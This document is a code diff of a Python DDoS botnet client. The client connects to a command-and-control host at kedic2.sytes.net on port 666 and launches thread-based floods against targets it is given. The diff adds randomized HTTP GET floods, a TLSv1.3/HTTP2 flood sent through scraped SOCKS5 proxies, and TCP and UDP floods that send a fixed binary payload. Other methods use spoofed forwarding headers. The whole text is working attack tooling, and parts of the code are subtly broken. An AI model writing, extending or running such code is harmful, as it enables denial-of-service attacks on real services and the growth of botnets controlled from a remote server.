@@ -1,13 +1,13 @@
 from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , SOCK_RAW , TCP_NODELAY , IPPROTO_TCP , IP_HDRINCL , IPPROTO_IP , IPPROTO_UDP , inet_aton
 from time import sleep
 from time import time
-from threading import Thread as thr
+from threading import Thread as thr , Lock as lck
 from urllib.parse import urlparse , urlunsplit
 from random import choice as che
 from random import randint as ran
 from random import _urandom as byt
 from certifi import where
-from ssl import CERT_NONE , create_default_context , SSLContext , PROTOCOL_TLSv1_2
+from ssl import CERT_NONE , create_default_context , SSLContext , PROTOCOL_TLSv1_2 , OP_NO_TLSv1 , OP_NO_TLSv1_1 , OP_NO_TLSv1_2 , TLSVersion
 from fake_useragent import UserAgent
 from string import ascii_letters , digits
 from struct import pack
@@ -22,13 +22,17 @@ from requests import get
 from h2.connection import H2Connection
 from base64 import b64encode
 from re import compile as compilee
+from random import choices
+from sys import modules
+from importlib.util import spec_from_file_location , module_from_spec
+from signal import SIGTERM
+from os import system , name , path , getpid , kill , getcwd
 
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
 
-ipc2 = '198.50.160.231'
+ipc2 = 'kedic2.sytes.net'
 portc2 = 666
-
 
 def strm(siz):
         return '%0x' % ran(0, 16 ** siz)
@@ -87,6 +91,9 @@ def wait_for_selector_visible(driver, selector, timeout):
         WebDriverWait(driver=driver, timeout=timeout, poll_frequency=1).until(
             lambda driver: driver.find_element("css selector" , selector).is_displayed()
         )
+
+def random_string(length , characters):
+    return ''.join(choices(characters , k=length))
 
 def udp_raw_head(target , port):
     ip_ver_ihl = 69
@@ -239,7 +246,7 @@ def mine_hex(target , port):
 
 def socks5geter():
     prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
-    prapi2 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/main/https.txt"
+    prapi2 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/master/https.txt"
     prapi3 = "https://www.proxy-list.download/api/v1/get?type=socks5"
     prapi4 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/main/socks5.txt"
     prapi5 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/main/connect.txt"
@@ -295,8 +302,8 @@ def socks5geter():
     pf.close()
     
 def iroxy():
-    prapixd = "https://fineproxy.org/wp-admin/admin-ajax.php?action=proxylister_download&nonce=bde80b50f4&format=txt&filter=%7B%7D"
-    pf = open('ir.txt', 'w+')
+    prapixd = "https://fineproxy.org/wp-admin/admin-ajax.php?action=proxylister_download&nonce=5b8e140742&format=txt&filter={}"
+    pf = open('ir.txt' , 'w+')
     rq = (get(prapixd).text).split()
     for pyy in rq:
         pf.write(pyy + '\n')
@@ -517,7 +524,13 @@ def main():
                                     s = socket(AF_INET , SOCK_STREAM)
                                     s.connect((target,port))
                                 for _ in range(rpc):
-                                    payl = f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()
+                                    pathr = (
+        "?" + random_string(1, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") + "=" +
+        random_string(8, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") +
+        random_string(1, "|=") +
+        random_string(8, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
+    )
+                                    payl = f'GET {pathr} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()
                                     s.send(payl)
                             except:
                                 pass
@@ -760,6 +773,52 @@ def main():
                                     ipt = spo_ip()
                                     payl = f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()
                                     s.send(payl)
+                            except:
+                                pass
+                            
+                    def tlsv1_3():
+                        while time() < timer:
+                            try:
+                                if url.split('://')[0] == 'https':
+                                    sok5 = open('theprxy.txt' , 'r').read().split()
+                                    s = socksocket()
+                                    s = socket.create_connection(target , port)
+                                    pri = che(sok5).split(':');
+                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
+                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                                    encrypted_data = b64encode(f"GET {path} HTTP/2\r\nHost: {target}\r\n\r\n".encode()).decode()
+                                    conn = H2Connection()
+                                    conn.initiate_connection()
+                                    ctx = create_default_context()
+                                    ctx.minimum_version = TLSVersion.TLSv1_3
+                                    ctx.maximum_version = TLSVersion.TLSv1_3
+                                    s = ctx.wrap_socket(s , server_hostname=target)
+                                    s.connect((target , port))
+                                else:
+                                    sok5 = open('theprxy.txt' , 'r').read().split()
+                                    s = socksocket()
+                                    pri = che(sok5).split(':');
+                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
+                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                                    encrypted_data = b64encode(f"GET {path} HTTP/2\r\nHost: {target}\r\n\r\n".encode()).decode()
+                                    conn = H2Connection()
+                                    conn.initiate_connection()
+                                    s.connect((target , port))
+                                for _ in range(rpc):
+                                    iur = "https" if url.split('://')[0] == "https" else "http"
+                                    payl = {
+                                        ":method": "GET",
+                                        ":path": path,
+                                        ":scheme": iur,
+                                        ":authority": target,
+                                        "user-agent": ua,
+                                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                                        "accept-encoding": "gzip, deflate, br",
+                                        "connection": "keep-alive",
+                                        "encrypted-data": encrypted_data
+                                    }
+                                    conn.send_headers(1  , payl)
+                                    s.send(conn.data_to_send())
                             except:
                                 pass
                                     
@@ -1092,7 +1151,28 @@ def main():
                                 s.connect((ip_tt , port))
                                 for _ in range(rpc):
                                     payl = mine_hex(target , port)
+                                    s.send(payl.encode())
+                            except:
+                                pass
+                            
+                    def tcp_null():
+                        while True:
+                            try:
+                                s = socket(AF_INET , SOCK_STREAM)
+                                s.connect((ip_tt , port))
+                                for _ in range(rpc):
+                                    payl =  b'\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01'
                                     s.send(payl)
+                            except:
+                                pass
+                            
+                    def udp_null():
+                        while True:
+                            try:
+                                s = socket(AF_INET , SOCK_DGRAM)
+                                for _ in range(rpc):
+                                    payl =  b'\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01'
+                                    s.sendto(payl , (target , port))
                             except:
                                 pass
 
@@ -1139,6 +1219,9 @@ def main():
                     elif method == 'http-ir':
                         for _ in range(threads):
                             thr(target=http_ir).start()
+                    elif method == 'tlsv1.3':
+                        for _ in range(threads):
+                            thr(target=tlsv1_3).start()
                     elif method == 'udp':
                         for _ in range(threads):
                             thr(target=udp).start()
@@ -1220,6 +1303,12 @@ def main():
                     elif method == 'min':
                         for _ in range(threads):
                             thr(target=mine).start()
+                    elif method == 'tcp-null':
+                        for _ in range(threads):
+                            thr(target=tcp_null).start()
+                    elif method == 'udp-null':
+                        for _ in range(threads):
+                            thr(target=udp_null).start()
                 except:
                     pass
         except:
@@ -1230,6 +1319,5 @@ def main():
                     s.close()
                 except:
                     pass
-            print("Retrying connection in 5 seconds...")
             sleep(5)
 main()
